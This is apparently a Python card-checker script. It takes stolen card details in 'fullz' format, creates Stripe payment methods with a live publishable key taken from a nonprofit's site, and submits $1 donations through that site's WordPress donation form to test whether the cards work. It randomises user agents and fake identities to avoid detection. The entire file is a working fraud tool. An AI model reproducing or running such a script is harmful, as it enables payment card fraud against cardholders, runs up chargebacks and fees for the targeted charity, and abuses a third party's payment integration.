import asyncio
import base64
import random
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import re
from bs4 import BeautifulSoup
from FUNC.defs import *

# import requests


def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None




async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        user_agent          = UserAgent().random
        random_data         = await get_random_info(session)
        fname               = random_data["fname"]
        lname               = random_data["lname"]
        email               = random_data["email"]



        data={
        'type':'card',
        'card[number]':cc,
        'card[cvc]':cvv,
        'card[exp_month]':mes,
        'card[exp_year]':ano,
        'guid':'15272133-9ede-4e6e-b794-c198bb382765d92456',
        'muid':'22e150f1-15d3-4b99-9666-08e841b7329b5c431b',
        'sid':'2952eb70-08a1-46eb-acf6-cbb91b9f98b949ab7d',
        'pasted_fields':'number',
        'payment_user_agent':'stripe.js/0c81e1259e; stripe-js-v3/0c81e1259e; card-element',
        'referrer':'https://lumivoce.org',
        'time_on_page':'27287',
        'key':'pk_live_519sODGHwVm9HtpVbGWn3R5HrSXBaErzDUXPjtr2JvODEXgSV8x7UQnU3fChIZ6hlwrgM4ubVpp1DFbUDX74ft4pV00GlpMnrpR',
        }
        response = await session.post('https://api.stripe.com/v1/payment_methods', data=data)


        try:
            id=response.json()['id']
            # print(id)
        except:
            return response.text
        

        params = {
            't': '1718807439228',
        }

        files = {
            'action': (None, 'fluentform_submit'),
            'data': (None, f'choose_time=One%20Time%20&payment_input=Other%20Amount&custom-payment-amount=1&input_text=Crish%20Niki&email=crishniki158%40gmail.com&payment_method=stripe&__fluent_form_embded_post_id=263&_fluentform_49_fluentformnonce=a73e2da4de&_wp_http_referer=%2Fdonate%2F&__stripe_payment_method_id={id}&isFFConversational=true'),
            'form_id': (None, '49'),
        }

        response = await session.post(
            'https://lumivoce.org/wp-admin/admin-ajax.php',
            params=params,
            files=files,
        )

        # print(response.text)

        response =response.text
        await asyncio.sleep(0.5)
        return response

    except Exception as e:
        return str(e)
